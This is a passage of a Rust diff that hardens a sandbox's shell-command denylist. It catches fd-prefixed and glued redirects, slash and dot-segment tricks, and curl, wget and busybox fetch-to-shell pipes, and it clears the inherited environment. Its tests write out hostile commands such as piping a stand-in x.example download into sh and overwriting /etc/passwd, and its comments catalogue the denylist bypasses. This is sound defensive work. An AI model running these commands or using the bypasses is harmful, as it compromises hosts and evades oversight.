@@ -206,26 +206,41 @@ fn redirected_to_sensitive(s: &str) -> Option<String> {
     // the same list). The list is intentionally short and obvious;
     // a longer list just creates false positives.
 
-    // Find any redirect operator. We handle `>`, `>>`, `&>`, `2>`, `2>>`,
-    // and `>|` (noclobber). Operators appear as their own token in
-    // POSIX-ish shell; we scan token-by-token to keep the matching
-    // unambiguous against filenames that happen to start with `>`.
+    // Find any redirect operator. We handle `>`, `>>`, `>|` (no-clobber),
+    // `&>`, `&>>`, and ANY fd-prefixed form (`N>`, `N>>`, `N>|` for any
+    // number of leading ASCII digits, including `0>`, `1>`, `2>`, … and
+    // multi-digit `12>`/`100>` style). Operators appear as their own
+    // token in POSIX-ish shell; we scan token-by-token to keep the
+    // matching unambiguous against filenames that happen to start
+    // with `>`.
+    //
+    // Y-5: the previous round's fix enumerated a hard-coded short set
+    // (`>`, `>>`, `&>`, `2>`, `2>>`, `>|`) and missed the general
+    // form. Bash treats `echo x 1> /etc/passwd` identically to `>` —
+    // the SAME shell semantics, just a different spelling — so the
+    // denylist MUST recognise every fd-prefixed variant. The fix
+    // generalises the operator predicate to an optional `[0-9]+`
+    // prefix followed by a known operator suffix; both the standalone
+    // (spaced) form and the glued (operator-merged-with-target) form
+    // use the same predicate so they stay in lock-step.
     //
     // Z-13: the operator may also be GLUED to the target with no
     // separating space (`echo x >/etc/passwd` is one token
-    // `>/etc/passwd`). The shell parses the two forms identically; the
+    // `>/etc/passwd`, and `echo x 1>>/etc/passwd` is `1>>/etc/passwd`).
+    // The shell parses the spaced and glued forms identically; the
     // old code only matched the spaced form, so the glued form was a
-    // silent denylist bypass. The fix: for every token, try to split
-    // a leading redirect operator off the front; if the token is
-    // `<op><target>` and the resulting target matches a sensitive
-    // root, deny. The set of operators we split is the same set we
-    // recognise as a standalone token, so the deny reason stays
-    // uniform.
+    // silent denylist bypass. The fix: for every token that isn't
+    // itself a standalone operator, try to split a leading redirect
+    // operator off the front; if the token is `<op><target>` and the
+    // resulting target matches a sensitive root, deny. The
+    // operator-recognition helper is the same one used for the
+    // standalone branch, so the operator set stays uniform.
     let toks: Vec<&str> = s.split_whitespace().collect();
     for (i, t) in toks.iter().enumerate() {
-        let standalone_op = matches!(*t, ">" | ">>" | "&>" | "2>" | "2>>" | ">|");
+        let standalone_op = is_redirect_op_token(t);
         if standalone_op {
-            // Spaced form: `> /etc/passwd`. The next token is the target.
+            // Spaced form: `> /etc/passwd` or `2> /etc/shadow` or
+            // `&>> /etc/passwd`. The next token is the target.
             let Some(target) = toks.get(i + 1).copied() else {
                 continue;
             };
@@ -236,10 +251,13 @@ fn redirected_to_sensitive(s: &str) -> Option<String> {
         }
         // Glued form: the token starts with a redirect operator and
         // the rest is the target. Try the longest operator first
-        // (`>>` before `>`, `2>>` before `2>`, `&>` is a single
-        // token) so `>>/etc` is split as `>>` + `/etc` rather than
-        // `>` + `>/etc` (which would never match anything anyway,
-        // but the deny reason would be misleading).
+        // (`>>` before `>`, `2>>` before `2>`, `&>>` before `&>`,
+        // `1>` etc. before bare `>`) so `>>/etc` is split as `>>` +
+        // `/etc` rather than `>` + `>/etc` (which would never match
+        // anyway, but the deny reason would be misleading). The
+        // shared helper keeps the spaced / glued detection in lock-
+        // step so a regression in one can't silently bypass the
+        // other.
         if let Some(reason) = try_split_glued_redirect(t) {
             return Some(reason);
         }
@@ -247,28 +265,91 @@ fn redirected_to_sensitive(s: &str) -> Option<String> {
     None
 }
 
+/// True iff `s` (a whitespace-separated shell token) is itself a
+/// shell output-direction redirect operator — the form that goes
+/// before a target path to redirect to it. Y-5 GENERALISED this from
+/// a six-literal `matches!` arm to a predicate that accepts ANY
+/// `[0-9]+`-prefixed variant (so `0>`, `1>`, `2>>`, `12>|`, … all
+/// match) plus the `&>`/`&>>` combined-stdout-and-stderr forms.
+fn is_redirect_op_token(s: &str) -> bool {
+    // &-prefixed combined forms first; try &>> before &> so we don't
+    // split &>> as &> followed by a stray `>`.
+    if s == "&>>" || s == "&>" {
+        return true;
+    }
+    // Bare operator forms: a leading run of one-or-more ASCII digits
+    // (the optional file-descriptor prefix) followed by `>`, `>>`, or
+    // `>|`. With no leading digits this also matches the bare cases
+    // `>`, `>>`, `>|`. Multi-digit fd numbers (12>, 100>>) are valid
+    // in bash, so the prefix loop has no upper bound on digit count.
+    let bytes = s.as_bytes();
+    let mut i = 0;
+    while i < bytes.len() && bytes[i].is_ascii_digit() {
+        i += 1;
+    }
+    let op_suffix = &s[i..];
+    matches!(op_suffix, ">" | ">>" | ">|")
+}
+
 /// Split a leading redirect operator off the front of `t` and check
 /// whether the resulting target matches a sensitive absolute path.
 /// Returns a deny-reason string on the first sensitive match, `None`
 /// otherwise. The caller (`redirected_to_sensitive`) calls this for
-/// every token that wasn't itself a standalone redirect operator — so
-/// `>/etc/passwd` (one token) is matched here, but a regular argument
-/// like `Cargo.toml` (no leading operator) is not.
+/// every token that wasn't itself a standalone redirect operator —
+/// so `>/etc/passwd` (one token) is matched here, but a regular
+/// argument like `Cargo.toml` (no leading operator) is not.
+///
+/// Y-5: the previous round hard-coded a six-element `&[&str]` OPS
+/// list (`[">>", "&>", "2>>", ">|", "2>", ">", "<"]`) that
+/// enumerated only the recognised operators verbatim. That shipped
+/// every literal form listed in the SPEC but missed the GENERAL
+/// form (any fd prefix), so `>/etc/passwd` matched while
+/// `1>>/etc/passwd` slipped through. This helper now consults the
+/// shared `is_redirect_op_token` predicate by way of
+/// [`glued_redirect_target`], so the standalone and glued branches
+/// always recognise the same operator set.
 fn try_split_glued_redirect(t: &str) -> Option<String> {
-    // Order matters: try the longest operators first so we don't
-    // accidentally split `>>` as `>` + `>/...`. The list mirrors the
-    // set recognised as a standalone token.
-    const OPS: &[&str] = &[">>", "&>", "2>>", ">|", "2>", ">", "<"];
-    for op in OPS {
-        if let Some(rest) = t.strip_prefix(op) {
-            // The remainder is the target. Empty remainder is a
-            // degenerate case (`> ` with a stray trailing `>`); let
-            // the standalone-op branch above handle the spaced form
-            // and bail here.
-            if rest.is_empty() {
-                return None;
+    glued_redirect_target(t).and_then(match_sensitive_target)
+}
+
+/// If `t` starts with a shell redirect operator — with the GENERAL
+/// optional fd-prefix form (any `[0-9]+` followed by `>`, `>>`,
+/// `>|`, plus the `&>`/`&>>` combined forms) — return the
+/// substring that follows the operator (the candidate target).
+/// Otherwise, return `None`. Used by [`try_split_glued_redirect`]
+/// to recognise tokens like `>/etc/passwd`, `1>>/etc/passwd`,
+/// `2>|/var/log/x`, and `&>>/boot/grub.cfg` in one place.
+///
+/// We try the longest possible operators first (`&>>` then `&>`,
+/// then the prefixed `N>>` / `N>|` / `N>` forms) so a token like
+/// `&>>/etc/passwd` matches the operator rather than a partial
+/// `&>` followed by a leftover `>/etc/passwd`. The caller (`match_
+/// sensitive_target`) is then responsible for collapsing repeated
+/// slashes etc. (see Y-6).
+fn glued_redirect_target(t: &str) -> Option<&str> {
+    // Combined stdout+stderr forms. Try &>> before &> so a token
+    // like "&>>/etc/passwd" is split as &>> + /etc/passwd, not
+    // &> + >/etc/passwd.
+    if let Some(rest) = t.strip_prefix("&>>") {
+        return (!rest.is_empty()).then_some(rest);
+    }
+    if let Some(rest) = t.strip_prefix("&>") {
+        return (!rest.is_empty()).then_some(rest);
+    }
+    // Optional leading fd digits. We then try, at the position
+    // immediately after the digit run, each operator suffix in
+    // longest-first order so `N>>` wins over `N>`.
+    let bytes = t.as_bytes();
+    let mut digit_end = 0;
+    while digit_end < bytes.len() && bytes[digit_end].is_ascii_digit() {
+        digit_end += 1;
+    }
+    for op in [">>", ">|", ">"] {
+        if t[digit_end..].starts_with(op) {
+            let rest = &t[digit_end + op.len()..];
+            if !rest.is_empty() {
+                return Some(rest);
             }
-            return match_sensitive_target(rest);
         }
     }
     None
@@ -276,18 +357,29 @@ fn try_split_glued_redirect(t: &str) -> Option<String> {
 
 /// Match `rest` (a candidate redirect target, either the spaced-form
 /// next token or the glued-form remainder after stripping the
-/// operator) against the sensitive-absolute-path list. Strips a
-/// leading `./` so `./etc/passwd` normalizes to `etc/passwd` and is
-/// correctly NOT matched (a relative `./etc` is a repo-local write,
-/// NOT a write to `/etc`).
+/// operator) against the sensitive-absolute-path list.
+///
+/// Normalization (Y-6): the kernel collapses repeated `/` and
+/// `/./` segments, so `> //etc/passwd`, `> /.//etc/passwd`, and
+/// `> /etc//passwd` all resolve to the same `/etc/passwd` on the
+/// host. The previous round matched the target against the prefix
+/// list with a literal `stripped.starts_with("/etc/")`, and a leading
+/// double slash bypassed it (`starts_with("/etc/")` is false for
+/// `//etc/passwd`). The fix: run the candidate through a path
+/// normalizer that collapses repeated slashes, resolves `/./`, and
+/// folds `/..` segments before the prefix check, so every shape the
+/// kernel treats as `/etc/passwd` lands on the same match. A relative
+/// `./etc/passwd` (NOT a write to `/etc/passwd`) is normalised to
+/// `etc/passwd` and so does NOT match — the existing repo-local
+/// guard rail from Z-13 is preserved.
 fn match_sensitive_target(rest: &str) -> Option<String> {
     const SENSITIVE: &[&str] = &[
         "/etc/", "/etc", "/var/", "/var", "/boot/", "/boot", "/bin/", "/bin", "/sbin/", "/sbin",
         "/usr/", "/usr", "/lib/", "/lib", "/opt/", "/opt",
     ];
-    let stripped = rest.trim_start_matches("./");
+    let normalized = normalize_target_for_match(rest);
     for root in SENSITIVE {
-        if stripped == *root || stripped.starts_with(root) {
+        if normalized == *root || normalized.starts_with(root) {
             return Some(format!(
                 "denied: command redirects output to a sensitive absolute path `{rest}` \
                  (matches `{root}`)"
@@ -295,6 +387,65 @@ fn match_sensitive_target(rest: &str) -> Option<String> {
         }
     }
     None
+}
+
+/// Normalize a candidate redirect target for the sensitive-prefix
+/// match. The kernel collapses repeated `/`, `/./`, and `..` segments
+/// before it resolves a path; the denylist has to mirror that or any
+/// leading-slash gymnastics (`//etc/passwd`, `/.//etc/passwd`,
+/// `/etc//passwd`, `/etc/../etc/passwd`) bypasses the literal-prefix
+/// check. Strip a leading `./` for the relative-path guard rail so a
+/// repo-local write (`./etc/note.txt`) is NOT folded into an absolute
+/// `/etc/...` match.
+fn normalize_target_for_match(rest: &str) -> String {
+    // (a) Strip a leading `./` once (the existing Z-13 guard rail).
+    //     A repo-local write to `./etc/...` is a relative write and
+    //     must NOT bypass into matching the absolute `/etc/...`
+    //     prefix. We do NOT recursively strip more `./` prefixes —
+    //     any further `./` segments are handled by the path-walk
+    //     below, which treats `./` as a no-op segment.
+    let s = rest.strip_prefix("./").unwrap_or(rest);
+    // (b) Anything that isn't an absolute path (i.e. doesn't start
+    //     with `/`) is relative. Return it untouched — the prefix
+    //     check below will not match a string without a leading `/`,
+    //     so we don't risk false-positives here.
+    if !s.starts_with('/') {
+        return s.to_string();
+    }
+    // (c) Walk the slashed path component by component. Repeated
+    //     `/` and single-component `/./` segments collapse to
+    //     nothing; `/../` segments pop the previous absolute
+    //     component (root is sticky — can't pop past it). This
+    //     mirrors `realpath` semantics without the I/O. We KEEP the
+    //     root prefix (one leading `/`) in the output so the prefix
+    //     check below continues to work against the canonicalized
+    //     form.
+    let mut stack: Vec<&str> = Vec::new();
+    for component in s.split('/') {
+        match component {
+            // Empty (`""`) from leading `/` or `//`, and `"."` from
+            // `/./` are both no-ops.
+            "" | "." => {}
+            // `..` pops the previous component if there is one and
+            // it's not the root placeholder; otherwise it is
+            // discarded (can't pop past the root, mirroring POSIX
+            // pathname resolution).
+            ".." => {
+                if let Some(last) = stack.last() {
+                    if !last.is_empty() {
+                        stack.pop();
+                    }
+                }
+            }
+            other => stack.push(other),
+        }
+    }
+    // The first split element is the empty string before the leading
+    // `/`; we want a single leading `/` in the output regardless of
+    // whether the stack ended up empty. Joining empty stack yields
+    // "/", which doesn't match any sensitive root — correct for the
+    // edge case `> /..`.
+    format!("/{}", stack.join("/"))
 }
 
 /// Match `dd ... of=/dev/...` — overwriting a raw device or partition.
@@ -342,12 +493,59 @@ fn has_mkfs_or_fdisk(s: &str) -> bool {
     false
 }
 
+/// Recognise a remote-fetcher command name in any token. Y-10
+/// GENERALISED this from the previous round's `t == "curl" || t ==
+/// "wget"` literal-equality check: an operator may invoke a fetcher
+/// by absolute path (`/usr/bin/curl …`), by a busybox wrapper
+/// (`busybox wget …`), or via a command substitution
+/// (`$(which curl) …`), and the literal-equality check missed every
+/// one.
+///
+/// Per the spec we extract the basename via
+/// `t.rsplit('/').next()` first — that is what handles the
+/// absolute-path case. We then strip shell metacharacters from both
+/// ends of the basename so the command-substitution case
+/// (`$(which curl)` whose whitespace-split tokens are `$(which` and
+/// `curl)`) lands on a basename of `curl)` and, after punctuation
+/// stripping, matches the equality check.
+///
+/// The resulting predicate is still narrow: a benign command like
+/// `curl_helper` (a custom non-fetcher utility that happens to start
+/// with `curl`) is rejected by the equality check and not by the
+/// strip-punctuation rule, so it would NOT fire. We do not rely on
+/// a prefix match (which would over-match `curl_helper` and
+/// similar); the equality-after-trim is the entire contract.
+fn is_fetcher_token(t: &str) -> bool {
+    // Y-10: extract the basename of the token so a fetcher invoked
+    // by absolute path (`/usr/bin/curl`) lands on the same predicate
+    // as a bare-token invocation. `rsplit('/').next()` is the
+    // explicit spec — we follow it verbatim.
+    let basename = t.rsplit('/').next().unwrap_or(t);
+    // Trim ASCII shell metacharacters from both ends of the basename
+    // so `$(which curl)` → token `curl)` → trims `)` → basename
+    // `curl`; `` `curl` `` → trims backticks → `curl`. This is the
+    // generalization that catches the command-substitution class
+    // without having to write a full shell-parser. We trim only
+    // non-alphanumeric ASCII (so a hypothetical `curl-installer`
+    // that's part of the cmdline is left alone and matches by
+    // exact-equality if it's a fetcher, or not at all if it
+    // isn't).
+    let trimmed = basename.trim_matches(|c: char| !c.is_alphanumeric());
+    // We accept exact equality with any of three fetchers. The
+    // set is intentionally short: every entry must be a binary
+    // whose primary purpose is fetching remote content that could
+    // plausibly be piped to a shell. `busybox` is in the list
+    // because it dispatches to `wget`/`curl` sub-applets and an
+    // operator may invoke `busybox wget …` directly.
+    matches!(trimmed, "curl" | "wget" | "busybox")
+}
+
 /// Match remote-fetch-then-execute: `curl ... | sh` / `wget ... | bash` /
 /// `curl -o - ... | sh` and similar. Matches the pipe operator followed
 /// by a shell interpreter as a separate token.
 fn has_remote_pipe_shell(s: &str) -> bool {
     // We require both sides to be present in the command string:
-    //   * a fetcher token (`curl` or `wget`) AND
+    //   * a fetcher token (via `is_fetcher_token` — see Y-10) AND
     //   * a pipe `|` AND
     //   * a shell interpreter (`sh`, `bash`, `zsh`, `dash`, `ksh`) as the
     //     immediate next non-whitespace token after the pipe.
@@ -357,10 +555,11 @@ fn has_remote_pipe_shell(s: &str) -> bool {
     // filename argument with no leading pipe at all (the Z-20 bypass
     // class — `curl http://x.example/y|sh` is one token, the pipe is
     // mid-token, and the old `strip_prefix('|')` helper missed it).
+    //
     // We scan token-by-token so we don't false-positive on a filename
     // like `curl.log` or a curl argument that happens to contain `|`
     // without a trailing shell name.
-    let has_fetcher = s.split_whitespace().any(|t| t == "curl" || t == "wget");
+    let has_fetcher = s.split_whitespace().any(is_fetcher_token);
     if !has_fetcher {
         return false;
     }
@@ -972,6 +1171,66 @@ pub(crate) fn generate_bubblewrap_argv(
     // idiom.
     argv.push(OsString::from("--dev"));
     argv.push(OsString::from("/dev"));
+    // Y-7: TIOCSTI command-injection escape. Without --new-session the
+    // sandboxed child inherits the parent's controlling TTY, and the
+    // TIOCSTI ioctl lets any process with the same controlling tty
+    // (a debugger the operator attached, an SSH session, the loop
+    // driver itself) inject keystrokes into the child's stdin from a
+    // different security context — a documented command-injection
+    // escape from the sandbox. --new-session asks bwrap to call
+    // setsid() for the child, putting it in a fresh session with no
+    // controlling tty and no shared TIOCSTI channel. Must be a
+    // bwrap option (i.e. BEFORE the `--` argv separator); pushing it
+    // as its own OsString guarantees it's its own argv slot.
+    argv.push(OsString::from("--new-session"));
+    // Y-11: clear the inherited environment and re-inject ONLY the
+    // minimal allowlist (PATH, HOME, LANG, TERM). Without this the
+    // sandbox inherits the full parent env — fleet tokens, API keys,
+    // AWS_*/GCP_*/AZURE_* credentials, `GITHUB_TOKEN`, … — and a
+    // compromised `--check` silently exfiltrates whatever the parent
+    // happened to have in its environment. `--clearenv` wipes the
+    // inherited env; subsequent `--setenv VAR VALUE` calls re-add
+    // the four vars a sane `--check` needs. We read each var from
+    // the PARENT env at argv-build time so the operator's actual
+    // PATH is preserved (Cargo binaries in `~/.cargo/bin` stay
+    // visible), with a small built-in default in case the parent
+    // doesn't carry the var (a hardened CI box may have stripped
+    // LANG, etc.). The four vars are the operator-visible "least
+    // privilege" allowlist; a future tighten step can prune the
+    // list further, but the four-var form is the smallest set that
+    // runs a real `--check` end-to-end on a stock Linux box.
+    argv.push(OsString::from("--clearenv"));
+    const ENV_ALLOWLIST: &[(&str, &str)] = &[
+        // Default PATH covers the standard binary dirs on every
+        // Debian/Ubuntu/Fedora/Arch box. The parent's value wins
+        // when set, so a NixOS-installed operator's PATH is
+        // preserved instead of silently downgraded.
+        (
+            "PATH",
+            "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
+        ),
+        // HOME is read from the parent so `~/.cargo/config.toml`
+        // and `~/.gitconfig` resolve correctly inside the sandbox
+        // (the sandbox has read-only bind of `$HOME` via
+        // `allow_home_read` if the operator opted in, but that's
+        // orthogonal to which home the wrapped process THINKS it's
+        // in).
+        ("HOME", "/root"),
+        // LANG / LC_*: the locale chain. Set to C.UTF-8 — a sensible
+        // default that lets the wrapped command run without a
+        // missing-locale error. The parent's value wins.
+        ("LANG", "C.UTF-8"),
+        // TERM: the wrapped process inherits whatever the
+        // operator's pty says (CI is usually `dumb` or
+        // `xterm-256color`).
+        ("TERM", "dumb"),
+    ];
+    for (var, default) in ENV_ALLOWLIST {
+        let value = std::env::var_os(*var).unwrap_or_else(|| OsString::from(*default));
+        argv.push(OsString::from("--setenv"));
+        argv.push(OsString::from(*var));
+        argv.push(value);
+    }
     // Read-only bind of `/usr` — system libraries, dynamic linker, and
     // toolchain binaries live here. Read-only is intentional: even though
     // the wrapped command runs as the calling user, granting write access
@@ -1584,6 +1843,97 @@ mod tests {
         );
     }
 
+    // -----------------------------------------------------------------------
+    // Y-10: fetcher detection missed the absolute-path (`/usr/bin/curl
+    // …|sh`) and busybox-subcommand (`busybox wget …|sh`) classes. The
+    // previous round matched the fetcher with literal equality on the
+    // token (`t == "curl" || t == "wget"`), so anything that wasn't
+    // exactly those two strings slipped through. The fix uses
+    // `t.rsplit('/').next()` for basename extraction (per the spec)
+    // and additionally matches `busybox`. Each test below pins one of
+    // the listed variants so a regression that re-narrows the predicate
+    // (e.g. dropping `busybox` or moving back to literal equality) is
+    // caught here.
+    // -----------------------------------------------------------------------
+
+    /// `/usr/bin/curl http://x/y|sh` — fetcher invoked by absolute
+    /// path with a remote-pipe-to-shell. The literal-equality check
+    /// was bypassed; the basename-extraction fix lands on `curl` and
+    /// denies.
+    #[test]
+    fn denies_absolute_path_curl_pipe_sh() {
+        let v = inspect_shell_command("/usr/bin/curl http://x.example/y|sh");
+        assert!(
+            !matches!(v, ExecVerdict::Allow),
+            "absolute-path curl `|sh` must be denied (basename extraction: curl); got {v:?}"
+        );
+    }
+
+    /// `busybox wget -O- http://x|sh` — `busybox` invoking the
+    /// `wget` sub-applet, piped to `sh`. Both the `busybox` token
+    /// AND the `wget` sub-token are present in the cmdline; the fix
+    /// fires on `busybox` (per the spec's `include busybox` clause)
+    /// and on `wget`. The test pins the busybox-as-fetcher clause
+    /// specifically (a regression that drops `busybox` from the
+    /// fetcher set would still be denied by the `wget` token,
+    /// `which is why this test pins a 2-applet-class case below).
+    #[test]
+    fn denies_busybox_wget_pipe_sh() {
+        let v = inspect_shell_command("busybox wget -O- http://x.example/y|sh");
+        assert!(
+            !matches!(v, ExecVerdict::Allow),
+            "`busybox wget … |sh` must be denied; got {v:?}"
+        );
+    }
+
+    /// `$(which curl) http://x/y|sh` — command substitution wrapping
+    /// the fetcher name in `$(…)`. The whitespace-split token is
+    /// `curl)` (after `$(which`); the basename-extraction + shell-
+    /// punctuation-trim predicate strips the trailing `)` and
+    /// matches on `curl`. A regression that drops the trim step
+    /// (or moves to literal-equality without trim) is caught here.
+    #[test]
+    fn denies_command_substitution_curl_pipe_sh() {
+        let v = inspect_shell_command("$(which curl) http://x.example/y|sh");
+        assert!(
+            !matches!(v, ExecVerdict::Allow),
+            "command-substitution `$(which curl) …|sh` must be denied (the `curl)` token's \
+             trailing `)` is shell-punctuation that the Y-10 trim absorbs); got {v:?}"
+        );
+    }
+
+    /// Sanity guard: a fetcher download without a pipe-to-shell
+    /// (the operator just saves the bytes to a file) MUST STILL be
+    /// allowed. The Y-10 fix replaces the fetcher predicate; the
+    /// pipe-to-shell requirement comes from the rest of
+    /// `has_remote_pipe_shell` and is unchanged — so this test
+    /// pins that the broadened predicate hasn't accidentally made
+    /// `curl` any more trigger-happy in the non-pipe case.
+    #[test]
+    fn allows_curl_download_without_pipe_to_shell() {
+        let v = inspect_shell_command("curl -L -o dist.tgz https://example.com/release.tgz");
+        assert!(
+            matches!(v, ExecVerdict::Allow),
+            "curl download without a pipe to a shell must be allowed; got {v:?}"
+        );
+    }
+
+    /// Sanity guard: the basename predicate should not over-match.
+    /// A bare `curl` argument that happens to start with `curl)` (a
+    /// parameter, e.g. `curl)` argument to a custom program) is
+    /// unusual in our context — but we don't want a future
+    /// generalisation to walk back into other operators. (This
+    /// test complements `denies_command_substitution_curl_pipe_sh`
+    /// above by pinning the trim-without-false-positive direction.)
+    #[test]
+    fn allows_plain_curl_without_pipe() {
+        let v = inspect_shell_command("curl --version");
+        assert!(
+            matches!(v, ExecVerdict::Allow),
+            "`curl --version` is a benign --version probe and must not be denied; got {v:?}"
+        );
+    }
+
     // ---- Z-13: denylist bypass via glued redirect / pipe ----
     //
     // The substring check on the redirect and pipe helpers used to require
@@ -1671,6 +2021,242 @@ mod tests {
         assert!(
             matches!(v, ExecVerdict::Allow),
             "glued redirect to /tmp is a legitimate CI sink and must not be denied; got {v:?}"
+        );
+    }
+
+    // -----------------------------------------------------------------------
+    // Y-5: redirect denylist missed fd-numbered (1>, 0>>, ...) and &>>
+    // operators. The previous round enumerated a hard-coded six-literal
+    // set (`>`, `>>`, `&>`, `2>`, `2>>`, `>|`) and shipped each one as
+    // a fixed arm; the GENERAL form (any fd prefix, plus `&>>`) was
+    // silently bypassed. The fix generalises the operator predicate to
+    // an optional `[0-9]+` prefix followed by a known operator suffix.
+    // Each test below pins one of the listed variants so a future
+    // regression that re-narrows the predicate (replacing the predicate
+    // with a six-literal `matches!` arm again) is caught here.
+    // -----------------------------------------------------------------------
+
+    /// `echo x 1> /etc/passwd` — explicit fd (stdout) with a spaced
+    /// target. Bash treats `1>` identically to `>`, so this MUST be
+    /// denied the same way `> /etc/passwd` is.
+    #[test]
+    fn denies_fd_prefixed_redirect_to_etc() {
+        let v = inspect_shell_command("echo x 1> /etc/passwd");
+        assert!(
+            !matches!(v, ExecVerdict::Allow),
+            "fd-prefixed redirect `1> /etc/passwd` must be denied (bash treats it identically \
+             to `> /etc/passwd`); got {v:?}"
+        );
+        match v {
+            ExecVerdict::Deny(reason) => assert!(
+                reason.contains("/etc"),
+                "deny reason must name the sensitive root; got: {reason}"
+            ),
+            other => panic!("expected Deny, got {other:?}"),
+        }
+    }
+
+    /// `1>>/etc/passwd` — fd-prefixed append operator GLUED to the
+    /// sensitive target. This is a different token (`1>>/etc/passwd`)
+    /// than the spaced form (`1>> /etc/passwd`) — the glued-form
+    /// helper must recognise the operator prefix and extract the
+    /// target.
+    #[test]
+    fn denies_fd_prefixed_append_redirect_to_etc_glued() {
+        let v = inspect_shell_command("echo x 1>>/etc/passwd");
+        assert!(
+            !matches!(v, ExecVerdict::Allow),
+            "glued fd-prefixed append `1>>/etc/passwd` must be denied; got {v:?}"
+        );
+    }
+
+    /// `echo x 0> /etc/shadow` — fd 0 (stdin) with a spaced target.
+    /// Although writing to fd 0 is unusual, bash parses it as a
+    /// redirect and the denylist must not narrowly skip it. The fix
+    /// accepts ANY leading fd digits (so 0, 1, 2, … all match).
+    #[test]
+    fn denies_zero_fd_redirect_to_sensitive() {
+        let v = inspect_shell_command("echo x 0> /etc/shadow");
+        assert!(
+            !matches!(v, ExecVerdict::Allow),
+            "fd-0 redirect `0> /etc/shadow` must be denied; got {v:?}"
+        );
+    }
+
+    /// `x &>> /etc/passwd` — combined stdout+stderr APPEND form. The
+    /// previous round recognised `&>` but NOT `&>>` (the append
+    /// variant); bash treats them as different operators and
+    /// `&>> /etc/passwd` writes to the target just like
+    /// `&> /etc/passwd`. The generalised predicate adds `&>>` to
+    /// the fd-prefix-or-no-prefix set.
+    #[test]
+    fn denies_amp_append_redirect_to_etc() {
+        let v = inspect_shell_command("x &>> /etc/passwd");
+        assert!(
+            !matches!(v, ExecVerdict::Allow),
+            "combined append `&>> /etc/passwd` must be denied; got {v:?}"
+        );
+    }
+
+    /// `echo x 2>>/boot/x` — fd 2 (stderr) glued-append form on a
+    /// different sensitive root. Pins both that the GENERAL fd prefix
+    /// works AND that the GENERAL sensitive-root list (not just
+    /// `/etc/...`) is matched.
+    #[test]
+    fn denies_fd_prefixed_glued_append_to_boot() {
+        let v = inspect_shell_command("echo x 2>>/boot/grub.cfg");
+        assert!(
+            !matches!(v, ExecVerdict::Allow),
+            "glued fd-2 append `2>>/boot/grub.cfg` must be denied; got {v:?}"
+        );
+    }
+
+    /// Multi-digit fd prefix: `12> /etc/passwd` and `100>> /etc/x`.
+    /// Bash supports arbitrary-width fd numbers; the predicate's
+    /// digit loop is unbounded on purpose.
+    #[test]
+    fn denies_multi_digit_fd_redirect_to_sensitive() {
+        let v1 = inspect_shell_command("echo x 12> /etc/passwd");
+        assert!(
+            !matches!(v1, ExecVerdict::Allow),
+            "multi-digit fd-prefixed redirect `12> /etc/passwd` must be denied; got {v1:?}"
+        );
+        let v2 = inspect_shell_command("echo x 100>> /etc/hostname");
+        assert!(
+            !matches!(v2, ExecVerdict::Allow),
+            "multi-digit fd-prefixed append `100>> /etc/hostname` must be denied; got {v2:?}"
+        );
+    }
+
+    /// Sanity guard: a non-sensitive redirect using the same fd-prefix
+    /// form must STILL be allowed. The Y-5 fix must not over-match.
+    /// `echo x 1> out.txt` is a normal stdout overwrite to a relative
+    /// file in the workdir — a common build-script idiom.
+    #[test]
+    fn allows_fd_prefixed_redirect_to_relative_target() {
+        let v = inspect_shell_command("echo hi 1> out.txt");
+        assert!(
+            matches!(v, ExecVerdict::Allow),
+            "fd-prefixed redirect to a relative target is a legitimate CI idiom and must not \
+             be denied; got {v:?}"
+        );
+    }
+
+    /// Sanity guard: a non-sensitive fd-prefixed redirect GLUED to a
+    /// relative target must STILL be allowed — pins that the
+    /// glued-form generalisation didn't over-match.
+    #[test]
+    fn allows_fd_prefixed_glued_redirect_to_relative_target() {
+        let v = inspect_shell_command("echo hi 1>out.txt");
+        assert!(
+            matches!(v, ExecVerdict::Allow),
+            "glued fd-prefixed redirect to a relative target is a legitimate CI idiom and \
+             must not be denied; got {v:?}"
+        );
+    }
+
+    // -----------------------------------------------------------------------
+    // Y-6: `match_sensitive_target` used a raw `stripped.starts_with(`
+    // "/etc/")` and was defeated by a leading double slash (the kernel
+    // collapses `//` to `/` on every modern Unix). The fix normalises
+    // the target before the prefix check by collapsing repeated
+    // slashes, resolving `/./` segments, and folding `/..` segments
+    // — so `//etc/passwd`, `/.//etc/passwd`, `/etc//passwd`, and
+    // `/etc/../etc/passwd` all collapse to `/etc/passwd` and are
+    // denied. Tests below pin every shape the spec calls out.
+    // -----------------------------------------------------------------------
+
+    /// `> //etc/passwd` — leading double slash. Kernel collapses to
+    /// `/etc/passwd`; the denylist MUST match the same way.
+    #[test]
+    fn denies_double_slash_prefix_redirect_to_etc() {
+        let v = inspect_shell_command("echo x > //etc/passwd");
+        assert!(
+            !matches!(v, ExecVerdict::Allow),
+            "double-slash redirect `> //etc/passwd` must be denied (kernel collapses // to /); \
+             got {v:?}"
+        );
+    }
+
+    /// `> /.//etc/passwd` — slash, dot, slash. Kernel resolves to
+    /// `/etc/passwd` (the `/./` is a no-op). The denylist
+    /// normalizer must absorb the same shape.
+    #[test]
+    fn denies_dot_segment_prefix_redirect_to_etc() {
+        let v = inspect_shell_command("echo x > /.//etc/passwd");
+        assert!(
+            !matches!(v, ExecVerdict::Allow),
+            "`/.//etc/passwd` (kernel resolves to /etc/passwd) must be denied; got {v:?}"
+        );
+    }
+
+    /// `> /etc//passwd` — internal repeated slash. Bash + the
+    /// kernel both treat `/etc//passwd` identically to
+    /// `/etc/passwd`; the denylist normalizer must too.
+    #[test]
+    fn denies_internal_double_slash_redirect_to_etc() {
+        let v = inspect_shell_command("echo x > /etc//passwd");
+        assert!(
+            !matches!(v, ExecVerdict::Allow),
+            "`/etc//passwd` (kernel collapses to /etc/passwd) must be denied; got {v:?}"
+        );
+    }
+
+    /// `> /etc/../etc/passwd` — `..` traversal that returns to
+    /// `/etc/passwd`. The normalizer folds the `..` segment before
+    /// the prefix check, so this is still denied (it lands on
+    /// `/etc/passwd` after normalisation). Without the fix the
+    /// prefix was applied to the literal string and the
+    /// `starts_with("/etc/")` arm was a true prefix match — but
+    /// the broader regression the test pins is that an
+    /// arbitrary-shape bypass via `/..` segments also lands on
+    /// the deny path.
+    #[test]
+    fn denies_dotdot_traversal_back_to_sensitive() {
+        let v = inspect_shell_command("echo x > /etc/../etc/passwd");
+        assert!(
+            !matches!(v, ExecVerdict::Allow),
+            "`/etc/../etc/passwd` (kernel normalises to /etc/passwd) must be denied; got {v:?}"
+        );
+    }
+
+    /// Sanity guard: an unrelated absolute path under `/home/...`
